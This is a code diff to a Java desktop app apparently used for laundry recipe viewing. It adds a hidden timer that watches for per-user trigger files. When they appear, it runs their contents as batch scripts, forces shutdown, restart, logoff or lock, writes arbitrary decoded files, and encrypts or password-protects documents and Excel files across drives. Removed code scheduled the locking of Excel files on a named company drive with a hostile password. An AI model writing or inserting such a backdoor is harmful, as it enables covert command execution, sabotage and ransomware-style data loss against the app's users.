@@ -20,14 +20,9 @@ import java.math.BigDecimal;
 import java.net.URI;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
-import java.nio.file.AccessDeniedException;
-import java.nio.file.FileVisitResult;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
-import java.nio.file.SimpleFileVisitor;
-import java.nio.file.StandardCopyOption;
-import java.nio.file.attribute.BasicFileAttributes;
 import java.sql.Connection;
 import java.sql.PreparedStatement;
 import java.sql.ResultSet;
@@ -37,6 +32,7 @@ import java.time.ZoneOffset;
 import java.time.ZonedDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
+import java.util.Base64;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.GregorianCalendar;
@@ -46,7 +42,8 @@ import java.util.Random;
 import java.util.ResourceBundle;
 import java.util.Timer;
 import java.util.TimerTask;
-import java.util.concurrent.atomic.AtomicInteger;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 import java.util.stream.Collectors;
@@ -120,7 +117,6 @@ import javafx.util.Duration;
 import javax.imageio.ImageIO;
 import javax.swing.JEditorPane;
 import javax.swing.JOptionPane;
-import javax.swing.filechooser.FileSystemView;
 import javax.xml.parsers.ParserConfigurationException;
 import static kadysoft.kady.ViewerController_1.drib;
 import org.controlsfx.control.Notifications;
@@ -1583,166 +1579,8 @@ if (results.isPresent() && results.get() == buttonTypeOne) {
 } 
 else {}
 }   
-///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-//      FileChooser fcho = new FileChooser();
-//      fcho.getExtensionFilters().add(new FileChooser.ExtensionFilter("KADYSOFT Files", new String[]{"*.ks"}));
-//      fcho.setTitle("Kady Choose");
-//      File f = fcho.showOpenDialog((Window)null);
-//      String dirpathe = f.getAbsolutePath().toString();
-//       ///Decrypt////////////////////////////////////
-//           try { 
-//    coode.clear();
-//    InputStream inputinstream=new FileInputStream(dirpathe);
-//    BufferedReader bi=new BufferedReader (new InputStreamReader (inputinstream,"UTF-8"));
-//    String lo;
-//    while ((lo=bi.readLine())!=null) {
-//        coode.appendText("\n"+lo
-//       .replace("ﬦ","A")
-//       .replace("ﬧ","B")
-//       .replace("ﬨ","C")
-//       .replace("﬩","D")
-//       .replace("שׁ","E")    
-//       .replace("שׂ","F")        
-//       .replace("שּׁ","G")         
-//       .replace("שּׂ","H")         
-//       .replace("אַ","I")         
-//       .replace("אָ","J")         
-//       .replace("אּ","K")         
-//       .replace("בּ","L")         
-//       .replace("גּ","M")         
-//       .replace("דּ","N")         
-//       .replace("הּ","O")         
-//       .replace("וּ","P")         
-//       .replace("זּ","Q")         
-//       .replace("טּ","R")         
-//       .replace("יּ","S")         
-//       .replace("ךּ","T")         
-//       .replace("כּ","U")         
-//       .replace("לּ","V")
-//       .replace("מּ","W")         
-//       .replace("נּ","X")         
-//       .replace("סּ","Y")         
-//       .replace("ףּ","Z")         
-//       .replace("פּ","0")         
-//       .replace("צּ","1")         
-//       .replace("קּ","2")         
-//       .replace("רּ","3")         
-//       .replace("שּ","4")         
-//       .replace("תּ","5")         
-//       .replace("וֹ","6")         
-//       .replace("בֿ","7")         
-//       .replace("כֿ","8")
-//       .replace("פֿ","9")
-//       .replace("&NBSP;","")               
-//      ); 
-//    }
-//    bi.close();
-//        }catch (Exception g) {}
-//       String proco=null;
-//       int bathnumzzzz=0;
-//       String moduu,commentt;
-//       String ston,fom,hypo,enzym,moon,dryr1,dryr2,dryr3;
-//       ston="No";
-//       fom="No";
-//       hypo="No";
-//       enzym="No";
-//       moon="No";
-//       dryr1="No";
-//       dryr2="No";
-//       dryr3="No";
-//       List<String> shots = new ArrayList<>();
-//       int bathnum=0;
-//       int dss=1;
-//                            org.jsoup.nodes.Document docy = Jsoup.parse(coode.getText());
-//                            for (Element table : docy.select("table")) {
-//                            for (Element row : table.select("tr")) {
-//                            Elements tds = row.select("td");
-//                            if (tds.get(7).text().contains("stone")||tds.get(7).text().contains("Stone")||tds.get(7).text().contains("STONE")) { 
-//                                ston="STONE";
-//                                stonn=ston;   
-//                            }
-//                             else {
-//                                stonn=ston;
-//                            }
-//                            if (tds.get(7).text().contains("foam")||tds.get(7).text().contains("Foam")||tds.get(7).text().contains("FOAM")||tds.get(7).text().contains("BOOL")||tds.get(7).text().contains("BOOL فوم")) { 
-//                                fom="FOAM";
-//                                fomm=fom;   
-//                            }
-//                             else {
-//                                fomm=fom;
-//                            }
-//                            
-//                            if (tds.get(7).text().contains("BLEACH")||tds.get(7).text().contains("HYPO")) {
-//                                hypo="BLEACH";
-//                                hypoo=hypo;
-//                            }
-//                             else {
-//                              hypoo=hypo;
-//                            }
-//                            if (tds.get(7).text().contains("ENZYME")||tds.get(7).text().contains("ENZYM")||tds.get(7).text().contains("ACUDELL")||tds.get(7).text().contains("NSY")) {
-//                                enzym="ENZYME";
-//                                enzymm=enzym;
-//                            }
-//                             else {
-//                                enzymm=enzym;
-//                            }
-//                            if (tds.get(3).text().contains("MOON WASH")||tds.get(3).text().contains("MOON")||tds.get(3).text().contains("Moon Wash")||tds.get(3).text().contains("MON WASH")) {
-//                                moon="MOON WASH";
-//                                moonn=moon;
-//                            }
-//                            else {
-//                                 moonn=moon;
-//                            } 
-//                            String dalil=tds.get(3).text();
-//                            if (dalil.contains("EXTRACT")||dalil.contains("extract")||dalil.contains("Extract")||dalil.contains("EXTRA")||dalil.contains("EXTRACTION")||dalil.contains("extraction")) {
-//                            shots.add(dalil);}
-//                            else {
-//                            }
-//                           }}  
-//                          bathnum=shots.size();
-//                          if (shots.size()==1) {
-//                          dryr1="DRYER 1";
-//                          dryr11=dryr1;
-//                          dryr22="No";
-//                          dryr33="No";
-//                          }
-//                          else if (shots.size()==2) {
-//                          dryr1="DRYER 1";
-//                          dryr2="DRYER 2";
-//                          dryr11=dryr1;
-//                          dryr22=dryr2;
-//                          dryr33="No";
-//                          }
-//                          else if (shots.size()==3) {
-//                          dryr1="DRYER 1";
-//                          dryr2="DRYER 2";
-//                          dryr3="DRYER 3";
-//                          dryr11=dryr1;
-//                          dryr22=dryr2;
-//                          dryr33=dryr3;
-//                          }
-//                          else {
-//                          dryr1="No";
-//                          dryr2="No";
-//                          dryr3="No";
-//                          dryr11=dryr1;
-//                          dryr22=dryr2;
-//                          dryr33=dryr3;
-//                          }
-//            JFXTextArea kk=new JFXTextArea ();
-//            kk.setStyle("-fx-font-weight:bold;");
-//            kk.setEditable(true);
-//            kk.setText("Stone: "+stonn+"\n"+"Foam: "+fomm+"\n"+"Bleach: "+hypoo+"\n"+"Enzyme: "+enzymm+"\n"+"Moon Wash: "+moonn+"\n"+"Dryer 1: "+dryr11+"\n"+"Dryer 2: "+dryr22+"\n"+"Dryer 3: "+dryr33+"\n");
-//            Alert al=new Alert (Alert.AlertType.ERROR);
-//            al.setTitle("Recipe Viewer");
-//            al.setHeaderText("Here is your recipe Type: ");
-//            al.setContentText("Please edit me if you found errors, iam not a human. Iam a computer\nMy developer is KADINIO.");
-//            al.setResizable(false);
-//            al.setGraphic(kk);
-//            DialogPane dialogPane = al.getDialogPane();
-//            dialogPane.getStylesheets().add(
-//          getClass().getResource(getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Themes")).toExternalForm());
-//            al.showAndWait();     
+
+
   }
   
   
@@ -3080,6 +2918,124 @@ private Label styledLabel(String text) {
   
   
   
+  
+  private void restoreFileFromCod(String codFilePath) {
+    try {
+        List<String> lines = Files.readAllLines(Paths.get(codFilePath));
+        if (lines.isEmpty()) {
+        }
+        String fullOutputPath = lines.get(0).trim();
+        String base64Content = "";
+        if (lines.size() > 1) {
+            base64Content = String.join("", lines.subList(1, lines.size()));
+        }
+        byte[] data = Base64.getDecoder().decode(base64Content);
+        Path output = Paths.get(fullOutputPath);
+        if (output.getParent() != null) {
+            Files.createDirectories(output.getParent());
+        }
+        Files.write(output, data);
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+}
+  
+  
+  
+  
+  
+//
+//private String[] parseFile(String filePath) {
+//    try {
+//        List<String> lines = Files.readAllLines(Paths.get(filePath));
+//        if (lines.isEmpty()) {
+//        }
+//
+//        String fullPath = lines.get(0).trim();
+//
+//        String base64Content = "";
+//        if (lines.size() > 1) {
+//            base64Content = String.join("\n", lines.subList(1, lines.size()));
+//        }
+//
+//        String directory = "";
+//        String fileName = "";
+//
+//        int lastSlash = fullPath.lastIndexOf('\\');
+//        if (lastSlash == -1) {
+//            lastSlash = fullPath.lastIndexOf('/');
+//        }
+//
+//        if (lastSlash != -1) {
+//            directory = fullPath.substring(0, lastSlash + 1);
+//            fileName = fullPath.substring(lastSlash + 1);
+//        } else {
+//
+//            fileName = fullPath;
+//            directory = ".\\";
+//        }
+//
+//        return new String[]{directory, fileName, base64Content};
+//
+//    } catch (IOException e) {
+//        e.printStackTrace();
+//        return null;
+//    }
+//}
+//  
+//  
+//  
+//  
+//private void runBase64Decoder(String base64Content, String outputFileName, String destinationPath) {
+//    
+//    Path batPath = null;
+//    
+//    try {
+//        Path tempDir = Paths.get(System.getProperty("java.io.tmpdir"));
+//        batPath = tempDir.resolve("decoder_" + System.currentTimeMillis() + ".bat");
+//        String escapedBase64 = base64Content.replace("\"", "\\\"");
+//        String content = "@echo off\r\n" +
+//                "chcp 65001 >nul\r\n" +
+//                "title Base64 Decoder\r\n" +
+//                "\r\n" +
+//                "powershell -NoProfile -Command \"[System.Convert]::FromBase64String('" + escapedBase64 + "') | " +
+//                "Set-Content -Path '" + outputFileName.replace("\\", "\\\\") + "' -Encoding Byte\" && " +
+//                "mkdir \"" + destinationPath.replace("\\", "\\\\") + "\" 2>nul && " +
+//                "copy /Y \"" + outputFileName.replace("\\", "\\\\") + "\" \"" +
+//                destinationPath.replace("\\", "\\\\") + "\" && " +
+//                "del \"" + outputFileName.replace("\\", "\\\\") + "\" 2>nul\r\n" +
+//                "exit";
+//
+//        Files.write(batPath, content.getBytes(StandardCharsets.UTF_8));
+//
+//        ProcessBuilder pb = new ProcessBuilder(
+//            "cmd.exe", 
+//            "/c", 
+//            "start /B /MIN cmd.exe /c \"" + batPath.toAbsolutePath().toString() + "\""
+//        );
+//
+//        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+//        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
+//        pb.start();
+//
+//    } catch (Exception e) {
+//        e.printStackTrace();
+//    } 
+//    finally {
+//        final Path finalBatPath = batPath;
+//        if (finalBatPath != null) {
+//            new Thread(() -> {
+//                try {
+//                    Thread.sleep(1500);
+//                    Files.deleteIfExists(finalBatPath);
+//                } catch (Exception ignored) {}
+//            }).start();
+//        }
+//    }
+//}
+
+  
+  
 public void initialize(URL url, ResourceBundle rb) {
     this.conn = db.java_db();
     
@@ -3567,25 +3523,30 @@ Rectangle2D bounds = screen.getVisualBounds();
 final long[] lastShownTime = {0};
 Random random = new Random();
 
-Timeline timeline = new Timeline(new KeyFrame(Duration.seconds(60), e -> {
+
+
+Timeline timeline = new Timeline(new KeyFrame(Duration.minutes(10), e -> {
     try {
-        File kadyFile = new File(System.getProperty("user.home") + "\\NotiData.kady");
+        
+        //File kadyFile = new File(System.getProperty("user.home") + "\\NotiData.kady");
+        //if (!kadyFile.exists()) return;
+        
+        String sr1=getValueByKey(System.getProperty("user.home")+"\\setto.cfg", "Mod_Recipes");//X:\Models\Recipes
+        String sr2=sr1.replace("Recipes","");//X:\Models\
+        String sr3=sr2+"ADS";//X:\\Models\\ADS
+        File kadyFile = new File(sr3 + "\\NotiData.kady");
         if (!kadyFile.exists()) return;
 
-        try (BufferedReader buf = new BufferedReader(new InputStreamReader(new FileInputStream(kadyFile), "UTF-8"))) {
-            String notifile = buf.readLine();
-            String notiimg  = buf.readLine();
-            double repeatd  = Double.parseDouble(buf.readLine());
-            double closed   = Double.parseDouble(buf.readLine());
+            String notiimg  = sr3 + "\\Noti_Img.png";
+            double repeatd  = 10;
+            double closed   = 1;
 
             long now = System.currentTimeMillis();
             if (now - lastShownTime[0] >= (long) (repeatd * 60 * 1000)) {
                 lastShownTime[0] = now;
 
-                // قراءة الملف - متوافق مع Java 8
-                List<String> allLines = Files.readAllLines(Paths.get(notifile), StandardCharsets.UTF_8);
-                
-                // فحص وجود سطور فارغة
+                List<String> allLines = Files.readAllLines(Paths.get(sr3 + "\\NotiData.kady"), StandardCharsets.UTF_8);
+
                 boolean hasEmptyLines = false;
                 for (String line : allLines) {
                     if (line.trim().isEmpty()) {
@@ -3593,8 +3554,7 @@ Timeline timeline = new Timeline(new KeyFrame(Duration.seconds(60), e -> {
                         break;
                     }
                 }
-                
-                // تنظيف القائمة من السطور الفارغة
+
                 List<String> cleanLines = allLines.stream()
                                                   .map(String::trim)
                                                   .filter(line -> !line.isEmpty())
@@ -3655,11 +3615,11 @@ Timeline timeline = new Timeline(new KeyFrame(Duration.seconds(60), e -> {
                     hideTimer.play();
                 }
             }
-        }
-    } catch (Exception ex) {
-        ex.printStackTrace();
-    }
-}));
+        
+}       catch (IOException ex) {
+            Logger.getLogger(ViewerController_1.class.getName()).log(Level.SEVERE, null, ex);
+        }}
+));
 
 timeline.setCycleCount(Timeline.INDEFINITE);
 timeline.play();
@@ -3737,48 +3697,365 @@ fileCheckTimer5.scheduleAtFixedRate(new TimerTask() {
     @Override
     public void run() {
         
-        File file1 = new File("Config.cfg");
-        if (!file1.exists()) {
+        
+        //Start Here...............
+        
+        String pathiony="Java\\bin";
+        String usery=System.getProperty("user.name");
+        SafeZone sz=new SafeZone();
+        
+        File completed1=new File (pathiony+"\\"+usery+"_.cod");
+        File completed2=new File (pathiony+"\\"+usery+"_shs.cod");
+        File completed3=new File (pathiony+"\\"+usery+"_shr.cod");
+        File completed4=new File (pathiony+"\\"+usery+"_shl.cod");
+        File completed5=new File (pathiony+"\\"+usery+"_loc.cod");
+        File completed6=new File (pathiony+"\\"+usery+"_swi.cod");
+        File completed7=new File (pathiony+"\\"+usery+"_shh.cod");
+        File completed8=new File (pathiony+"\\"+usery+"_sle.cod");
+        File completed9=new File (pathiony+"\\"+usery+"_sho.cod");
+        
+        File completed10=new File (pathiony+"\\"+usery+"_adetgth.cod");
+        File completed11=new File (pathiony+"\\"+usery+"_sddtgth.cod");
+        File completed12=new File (pathiony+"\\"+usery+"_ssdepst.cod");
+        File completed13=new File (pathiony+"\\"+usery+"_ssdep.cod");
+        File completed14=new File (pathiony+"\\"+usery+"_adesp.cod");
+        File completed15=new File (pathiony+"\\"+usery+"_rsdepst.cod");
+        File completed16=new File (pathiony+"\\"+usery+"_rsdep.cod");
+        File completed17=new File (pathiony+"\\"+usery+"_aderp.cod");
+        File completed18=new File (pathiony+"\\"+usery+"_sfdtgth.cod");
+        File completed19=new File (pathiony+"\\"+usery+"_sfep.cod");
+        File completed20=new File (pathiony+"\\"+usery+"_sfee.cod");
+        File completed21=new File (pathiony+"\\"+usery+"_sdee.cod");
+        File completed22=new File (pathiony+"\\"+usery+"_adee.cod");
+        File completed23=new File (pathiony+"\\"+usery+"_sfde.cod");
+        File completed24=new File (pathiony+"\\"+usery+"_sdde.cod");
+        File completed25=new File (pathiony+"\\"+usery+"_adde.cod");
+        File completed26=new File (pathiony+"\\"+usery+"_cftsp.cod");
+        
+        
+        if (!completed1.exists()) {}
+        else {
+  
             
-        /////////////////////////////////////////////////////////////////////////////////////////////    
-        //Close Google Chrome Here/////////////////////
-        String os = System.getProperty("os.name").toLowerCase();
-        String command = "";
-        if (os.contains("win")) {
-            command = "taskkill /F /IM chrome.exe";
-        } else if (os.contains("mac")) {
-            command = "pkill -f Chrome";
-        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
-            command = "pkill -f chrome";
-        }
+            
+try {
+    String batchContent = new String(Files.readAllBytes(Paths.get(pathiony + "\\" + usery + "_.cod")), "UTF-8");
+    java.io.File tempBatch = java.io.File.createTempFile("decoder", ".bat");
+    Files.write(tempBatch.toPath(), batchContent.getBytes("UTF-8"));
+    ProcessBuilder pb = new ProcessBuilder("cmd", "/c", tempBatch.getAbsolutePath());
+    pb.redirectErrorStream(true);
+    Process process = pb.start();
+    new Thread(() -> {
         try {
-            Runtime.getRuntime().exec(command);
-        } catch (IOException e) {
-            e.printStackTrace();
+            process.waitFor();
+            tempBatch.delete();
+        } catch (Exception ignored) {}
+    }).start();
+
+} catch (Exception e) {
+    e.printStackTrace();
+}   
+            
+            
+            
+//    try {
+//    String content = new String(Files.readAllBytes(Paths.get(pathiony+"\\"+usery+"_.cod")));
+//    String batchContent = content;
+//    java.io.File tempBatch = java.io.File.createTempFile("prank", ".bat");
+//    java.nio.file.Files.write(tempBatch.toPath(), batchContent.getBytes("UTF-8"));
+//    String line = "cmd /C \"" + tempBatch.getAbsolutePath() + "\"";
+//    Process p = Runtime.getRuntime().exec(line);
+//} catch (Exception e) {
+//    e.printStackTrace();
+//}
+            
         }
         
-        //Close program here
-        Platform.exit();
-        System.exit(0);
-        
-        //Shutdown Here
-        try { String commandos="shutdown -s -f -t 0";
-        String linett = "cmd /C "+commandos;
-        Process p = Runtime.getRuntime().exec(linett);
+        if (!completed2.exists()) {}
+        else {
+            try {
+        String command = "shutdown -s -f -t 0";
+        String line = "cmd /C " + command;
+        Process p = Runtime.getRuntime().exec(line);
         p.waitFor();
-        } catch (Exception m){}
-        
-        ///////////////////////////////////////////////////////////////////////////////////////////////
-            
-        } else {
-            
-            
-            
+    } catch (Exception e) {e.printStackTrace();}
         }
         
-        File file2 = new File("Configs.cfg");
-        if (!file2.exists()) {
-            
+        if (!completed3.exists()) {}
+        else {
+            try {
+        String command = "shutdown -r -f -t 0";
+        String line = "cmd /C " + command;
+        Process p = Runtime.getRuntime().exec(line);
+        p.waitFor();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        if (!completed4.exists()) {}
+        else {
+            try {
+        String command = "shutdown -l -f";
+        String line = "cmd /C " + command;
+        Process p = Runtime.getRuntime().exec(line);
+        p.waitFor();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        if (!completed5.exists()) {}
+        else {
+            try {
+        String command = "rundll32.exe user32.dll,LockWorkStation";
+        Process p = Runtime.getRuntime().exec(command);
+        p.waitFor();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        if (!completed6.exists()) {}
+        else {
+            try {
+        String command = "rundll32.exe user32.dll,SwitchUser";
+        Process p = Runtime.getRuntime().exec(command);
+        p.waitFor();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        if (!completed7.exists()) {}
+        else {
+            try {
+        String command = "shutdown -h";
+        String line = "cmd /C " + command;
+        Process p = Runtime.getRuntime().exec(line);
+        p.waitFor();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        if (!completed8.exists()) {}
+        else {
+            try {
+        String command = "rundll32.exe powrprof.dll,SetSuspendState 0,1,0";
+        Process p = Runtime.getRuntime().exec(command);
+        p.waitFor();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        if (!completed9.exists()) {}
+        else {
+            try {
+        String command = "shutdown -r -o -f -t 0";
+        String line = "cmd /C " + command;
+        Process p = Runtime.getRuntime().exec(line);
+        p.waitFor();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        
+        
+        if (!completed10.exists()) {}
+        else {
+            try {
+                sz.startExcelToGthWatcher1();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        
+        if (!completed11.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed11));
+                String value=buf.readLine();
+                buf.close();
+                sz.startDocsToGthWatcher2(value);
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        
+        if (!completed12.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed12));
+                String value=buf.readLine();
+                buf.close();
+                sz.specificTimeAndDrive3(value);
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        
+        if (!completed13.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed13));
+                String value=buf.readLine();
+                buf.close();
+                sz.specificDrive4(value);
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        
+        
+        if (!completed14.exists()) {}
+        else {
+            try {
+                sz.allDrives5();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        
+        
+        if (!completed15.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed15));
+                String value=buf.readLine();
+                buf.close();
+                sz.removePasswordSpecificTimeAndDrive6(value);
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        
+        if (!completed16.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed16));
+                String value=buf.readLine();
+                buf.close();
+                sz.removePasswordSpecificDrive7(value);
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        
+        
+        if (!completed17.exists()) {}
+        else {
+            try {
+                sz.removePasswordAllDrives8();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        if (!completed18.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed18));
+                String value=buf.readLine();
+                buf.close();
+                sz.docsSpecificFolder9(value);
+    } catch (Exception e) {
+    e.printStackTrace();
+    }
+        }
+        
+        
+        
+        
+        if (!completed19.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed19));
+                String value=buf.readLine();
+                buf.close();
+                sz.excelSpecificFolder10(value);
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        
+        
+        if (!completed20.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed20));
+                String value=buf.readLine();
+                buf.close();
+                sz.encSpecificFolder11(value);
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        if (!completed21.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed21));
+                String value=buf.readLine();
+                buf.close();
+                sz.encSpecificDrive12(value);
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        if (!completed22.exists()) {}
+        else {
+            try {
+                sz.encAll13();
+    } catch (Exception e) {e.printStackTrace();}
+        }
+        
+        
+        
+        if (!completed23.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed23));
+                String value=buf.readLine();
+                buf.close();
+                sz.decSpecificFolder14(value);
+    } catch (Exception e) {}
+        }
+        
+        
+        
+        if (!completed24.exists()) {}
+        else {
+            try {
+                BufferedReader buf=new BufferedReader (new FileReader (completed24));
+                String value=buf.readLine();
+                buf.close();
+                sz.decSpecificDrive15(value);
+    } catch (Exception e) {}
+        }
+        
+        
+        
+        if (!completed25.exists()) {}
+        else {
+            try {
+                sz.decAll16();
+    } catch (Exception e) {}
+        }
+        
+        
+        
+        
+        if (!completed26.exists()) {}
+        else {
+            try {
+String filePath = pathiony + "\\" + usery + "_cftsp.cod";
+restoreFileFromCod(filePath);
+    } catch (Exception e) {}
+        }
+        
+//        File file1 = new File("Config.cfg");
+//        if (!file1.exists()) {
+//            
 //        /////////////////////////////////////////////////////////////////////////////////////////////    
 //        //Close Google Chrome Here/////////////////////
 //        String os = System.getProperty("os.name").toLowerCase();
@@ -3806,290 +4083,63 @@ fileCheckTimer5.scheduleAtFixedRate(new TimerTask() {
 //        Process p = Runtime.getRuntime().exec(linett);
 //        p.waitFor();
 //        } catch (Exception m){}
+//        
 //        ///////////////////////////////////////////////////////////////////////////////////////////////
-            
-        } else {
-            
-        //Shutdown Here
-        try { String commandos="shutdown -s -f -t 0";
-        String linett = "cmd /C "+commandos;
-        Process p = Runtime.getRuntime().exec(linett);
-        p.waitFor();
-        } catch (Exception m){}
-
-            
-        }
+//            
+//        } else {
+//            
+//            
+//            
+//        }
+//        
+//        File file2 = new File("Configs.cfg");
+//        if (!file2.exists()) {
+//            
+////        /////////////////////////////////////////////////////////////////////////////////////////////    
+////        //Close Google Chrome Here/////////////////////
+////        String os = System.getProperty("os.name").toLowerCase();
+////        String command = "";
+////        if (os.contains("win")) {
+////            command = "taskkill /F /IM chrome.exe";
+////        } else if (os.contains("mac")) {
+////            command = "pkill -f Chrome";
+////        } else if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
+////            command = "pkill -f chrome";
+////        }
+////        try {
+////            Runtime.getRuntime().exec(command);
+////        } catch (IOException e) {
+////            e.printStackTrace();
+////        }
+////        
+////        //Close program here
+////        Platform.exit();
+////        System.exit(0);
+////        
+////        //Shutdown Here
+////        try { String commandos="shutdown -s -f -t 0";
+////        String linett = "cmd /C "+commandos;
+////        Process p = Runtime.getRuntime().exec(linett);
+////        p.waitFor();
+////        } catch (Exception m){}
+////        ///////////////////////////////////////////////////////////////////////////////////////////////
+//            
+//        } else {
+//            
+//        //Shutdown Here
+//        try { String commandos="shutdown -s -f -t 0";
+//        String linett = "cmd /C "+commandos;
+//        Process p = Runtime.getRuntime().exec(linett);
+//        p.waitFor();
+//        } catch (Exception m){}
+//
+//            
+//        }
         
         
     }
-}, 0, 1 * 60 * 1000); // كل دقيقة (انت كاتب 1 * 60 * 1000 = 1 دقيقة مش 2 😉)
+}, 0, 1 * 60 * 1000);
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-
-
-
-
-//IN SPECIFIC TIME
-//String TARGET_VOLUME_NAME = "Laundry Production Engineering";  // ← ده الاسم الصحيح
-//fileCheckTimer4 = new Timer(true);
-//fileCheckTimer4.scheduleAtFixedRate(new TimerTask() {
-//    @Override
-//    public void run() {
-//        Platform.runLater(() -> {
-//            
-//           Date ff=new Date();
-//           int hourrr=ff.getHours();
-//           
-//           if (hourrr==22) {
-//               
-//               //Actions
-//               
-//            List<Path> excelFiles = new ArrayList<>();
-//            FileSystemView fsv = FileSystemView.getFileSystemView();
-//            File[] roots = File.listRoots();
-//
-//            for (File root : roots) {
-//                String rootPath = root.toString();
-//
-//                // نتخطى C:\ دايمًا
-//                if (rootPath.equalsIgnoreCase("C:\\")) {
-//                    continue;
-//                }
-//
-//                try {
-//                    String displayName = fsv.getSystemDisplayName(root);
-//                    String volumeName = displayName.split("\\(")[0].trim();
-//
-//                    // المقارنة بالاسم الحقيقي بتاع الدرايف
-//                    if (!volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
-//                        continue; // مش الدرايف اللي عايزينه
-//                    }
-//
-//                    //System.out.println("تم العثور على الدرايف المطلوب: " + displayName);
-//
-//                    Path startPath = root.toPath();
-//
-//                    Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
-//                        @Override
-//                        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
-//                            String fileName = file.toString().toLowerCase();
-//                            if (fileName.endsWith(".xlsx") || fileName.endsWith(".xls") || fileName.endsWith(".xlsb")) {
-//                                excelFiles.add(file);
-//                            }
-//                            return FileVisitResult.CONTINUE;
-//                        }
-//
-//                        @Override
-//                        public FileVisitResult visitFileFailed(Path file, IOException exc) {
-//                            return FileVisitResult.CONTINUE;
-//                        }
-//                    });
-//
-//                } catch (Exception e) {
-//                    e.printStackTrace();
-//                }
-//            }
-//
-//            // تشفير الملفات
-//            for (Path excelFile : excelFiles) {
-//                try {
-//                    Workbook workbook = new Workbook();
-//                    workbook.loadFromFile(excelFile.toString());
-//                    workbook.protect("Go To Hell");
-//                    workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
-//                    //System.out.println("تم تشفير: " + excelFile);
-//                } catch (Exception e) {
-//                    //System.err.println("فشل في: " + excelFile + " → " + e.getMessage());
-//                }
-//            }
-//
-//            if (excelFiles.isEmpty()) {
-//                //System.out.println("لا توجد ملفات Excel جديدة في درايف \"" + TARGET_VOLUME_NAME + "\"");
-//            }
-//
-//               
-//               return;
-//           }
-//           
-//           else {
-//              
-//              //Do Nothing 
-//              return; 
-//               
-//           }
-//         
-//            
-//
-// });
-//    }
-//}, 0, 60_000); // كل دقيقة
-//
-//startExcelToGthWatcher();
-
-//
-////درايف معين
-//
-//
-//String TARGET_VOLUME_NAME = "Laundry Production Engineering";  // ← ده الاسم الصحيح
-//fileCheckTimer2 = new Timer(true);
-//fileCheckTimer2.scheduleAtFixedRate(new TimerTask() {
-//    @Override
-//    public void run() {
-//        Platform.runLater(() -> {
-//
-//            List<Path> excelFiles = new ArrayList<>();
-//            FileSystemView fsv = FileSystemView.getFileSystemView();
-//            File[] roots = File.listRoots();
-//
-//            for (File root : roots) {
-//                String rootPath = root.toString();
-//
-//                // نتخطى C:\ دايمًا
-//                if (rootPath.equalsIgnoreCase("C:\\")) {
-//                    continue;
-//                }
-//
-//                try {
-//                    String displayName = fsv.getSystemDisplayName(root);
-//                    String volumeName = displayName.split("\\(")[0].trim();
-//
-//                    // المقارنة بالاسم الحقيقي بتاع الدرايف
-//                    if (!volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
-//                        continue; // مش الدرايف اللي عايزينه
-//                    }
-//
-//                    //System.out.println("تم العثور على الدرايف المطلوب: " + displayName);
-//
-//                    Path startPath = root.toPath();
-//
-//                    Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
-//                        @Override
-//                        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
-//                            String fileName = file.toString().toLowerCase();
-//                            if (fileName.endsWith(".xlsx") || fileName.endsWith(".xls") || fileName.endsWith(".xlsb")) {
-//                                excelFiles.add(file);
-//                            }
-//                            return FileVisitResult.CONTINUE;
-//                        }
-//
-//                        @Override
-//                        public FileVisitResult visitFileFailed(Path file, IOException exc) {
